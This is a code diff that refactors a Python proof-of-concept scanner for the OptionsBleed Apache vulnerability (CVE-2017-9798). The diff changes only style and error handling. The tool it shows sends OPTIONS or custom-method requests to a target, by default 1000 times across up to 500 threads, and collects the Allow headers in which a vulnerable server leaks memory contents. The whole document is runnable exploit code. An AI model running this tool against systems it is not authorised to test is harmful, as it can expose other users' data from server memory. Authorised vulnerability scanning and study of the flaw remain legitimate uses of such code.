@@ -1,6 +1,5 @@
 # OptionsBleed (CVE-2017-9798) PoC / Scanner
 # br0k3ns0und
-# zeroex00.com
 
 import requests
 import argparse
@@ -12,7 +11,8 @@ parser = argparse.ArgumentParser()
 parser.add_argument('url', type=str, help='full URL (including http(s)) to be scanned')
 parser.add_argument('-c', '--count', type=int, default=1000, help='number of times to scan (default: 1000)')
 parser.add_argument('-f', '--force', type=str, choices={'option', 'custom'},
-            help='forces the scan to attempt using custom verb method OR OPTIONS (default: try OPTIONS THEN custom)')
+                    help='forces the scan to attempt using custom verb method OR OPTIONS '
+                         '(default: try OPTIONS THEN custom)')
 parser.add_argument('-tc', '--thread-count', type=int, default=500, help='max concurrent thread count (default: 500)')
 parser.add_argument('-nv', '--no-verify', action='store_false', default=True,
                     help='does not verify ssl connection (may be necessary for self-signed certs)')
@@ -25,35 +25,40 @@ if not args.no_ignore:
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 
-def does_it_bleed(url, method, verify=True):
+def does_it_bleed(url: str, method: str, verify=True) -> bool:
     header = {'user-agent': 'Mozilla'}
-    r = ''
-    print('[+] checking {0} method'.format(method.upper()))
+    print(f'[+] checking {method.upper()} method')
+
     try:
         if method == 'option':
             r = requests.options(url, headers=header, verify=verify, timeout=5)
         elif method == 'custom':
             r = requests.request('PULL', url, headers=header, verify=verify, timeout=5)
         else:
-            print('[!] invalid method!')
+            print(f'[!] invalid method: {method}')
             return False
     except requests.exceptions.ConnectionError:
-        print('[!] connection error!')
+        print('[!] connection error')
         return False
     except requests.exceptions.ReadTimeout:
-        print('[!] connection timed out!')
+        print('[!] connection timed out')
         return False
+
     # TODO: SSL verify exception
-    low_headers = [header.lower() for header in r.headers.keys()]
+    low_headers = [header.lower() for header in list(r.headers)]
     if args.verbose:
-        print('[*] VERBOSE: \n\t-raw {0} headers: \n\t{1} \n\t-low {0} headers: \n\t{2}'.format(
-            method.upper(), ' '.join(r.headers.keys()), ' '.join(low_headers)))
+        print(f'[*] VERBOSE: \n'
+              f'\t-raw {method.upper()} headers: \n'
+              f'\t{" ".join(r.headers.keys())} \n'
+              f'\t-low {method.upper()} headers: \n'
+              f'\t{" ".join(low_headers)}')
+
     if 'allow' in low_headers:
-        print('[+] allow headers detected in {0} response'.format(method.upper()))
+        print(f'[+] allow headers detected in {method.upper()} response')
         return True
 
 
-def bleed(url, method='option', verify=True):
+def bleed(url: str, method='option', verify=True):
     header = {'user-agent': 'Mozilla'}
     try:
         if method == 'custom':
@@ -61,8 +66,9 @@ def bleed(url, method='option', verify=True):
         else:
             r = requests.options(url, headers=header, verify=verify, timeout=2)
     except Exception as e:
-        errors.append(str(e.message))
+        errors.append(str(e))
         return
+
     results.append(r.headers.get('Allow'))
 
 
@@ -76,8 +82,10 @@ def hemorrhage(count, bleed_method, thread_count=None):
 
 
 def main():
-    print('\n\t::OptionsBleed (CVE-2017-9798) Scanner::\n')
-    print('[+] scanning {} to see if it bleeds!'.format(args.url))
+    print('')
+    print('\t::OptionsBleed (CVE-2017-9798) Scanner::')
+    print('')
+    print(f'[+] scanning {args.url} to see if it bleeds!')
 
     if args.force:
         if does_it_bleed(args.url, args.force):
@@ -89,6 +97,7 @@ def main():
         options_test = does_it_bleed(args.url, 'option')
         custom_test = does_it_bleed(args.url, 'custom')
         method_count = 1
+
         if options_test and custom_test:
             method_count = 2
         if options_test:
@@ -101,11 +110,13 @@ def main():
             print('[+] allow header NOT detected')
             exit(1)
 
-    print('[+] {0} responses captured'.format(len(results)))
+    print(f'[+] {len(results)} responses captured')
     print('[+] unique results: \n{0}'.format('\n'.join(list(set(results)))))
+
     if args.errors:
-        print('[+] {0} errors captured'.format(len(errors)))
+        print(f'[+] {len(errors)} errors captured')
         print('[+] unique errors:\n{0}'.format('\n'.join(list(set(errors)))))
+
     print('[+] scan complete!')
 
 
